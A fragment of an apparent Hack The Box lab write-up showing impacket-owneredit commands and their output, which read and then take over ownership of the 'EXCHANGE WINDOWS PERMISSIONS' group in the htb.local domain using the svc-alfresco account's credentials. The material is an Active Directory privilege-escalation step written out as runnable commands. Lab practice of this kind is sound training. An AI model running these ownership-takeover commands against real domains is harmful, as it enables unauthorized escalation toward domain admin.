## -action read
```sh
└─$ impacket-owneredit -ts -debug -dc-ip 10.129.135.115 -target 'EXCHANGE WINDOWS PERMISSIONS' -action read 'htb.local/svc-alfresco:s3rvice'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-09-23 19:38:49] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-09-23 19:38:52] [+] Initializing domainDumper()
[2025-09-23 19:38:52] [+] Target principal found in LDAP (EXCHANGE WINDOWS PERMISSIONS)
[2025-09-23 19:38:52] [*] Current owner information below
[2025-09-23 19:38:52] [*] - SID: S-1-5-21-3072663084-364016917-1341370565-512
[2025-09-23 19:38:53] [*] - sAMAccountName: Domain Admins
[2025-09-23 19:38:53] [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=htb,DC=local
```

## -action write
```sh
└─$ impacket-owneredit -debug -dc-ip 10.129.25.235 -new-owner 'svc-alfresco' -target 'EXCHANGE WINDOWS PERMISSIONS' -action write 'htb.local/svc-alfresco:s3rvice'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Initializing domainDumper()
[+] Target principal found in LDAP (EXCHANGE WINDOWS PERMISSIONS)
[+] Found new owner SID: S-1-5-21-3072663084-364016917-1341370565-1147
[*] Current owner information below
[*] - SID: S-1-5-21-3072663084-364016917-1341370565-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=htb,DC=local
[+] Attempt to modify the OwnerSid
[*] OwnerSid modified successfully!
                                                                                  

└─$ impacket-owneredit -debug -dc-ip 10.129.25.235 -target 'EXCHANGE WINDOWS PERMISSIONS' -action read 'htb.local/svc-alfresco:s3rvice'                           
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Initializing domainDumper()
[+] Target principal found in LDAP (EXCHANGE WINDOWS PERMISSIONS)
[*] Current owner information below
[*] - SID: S-1-5-21-3072663084-364016917-1341370565-1147
[*] - sAMAccountName: svc-alfresco
[*] - distinguishedName: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
```
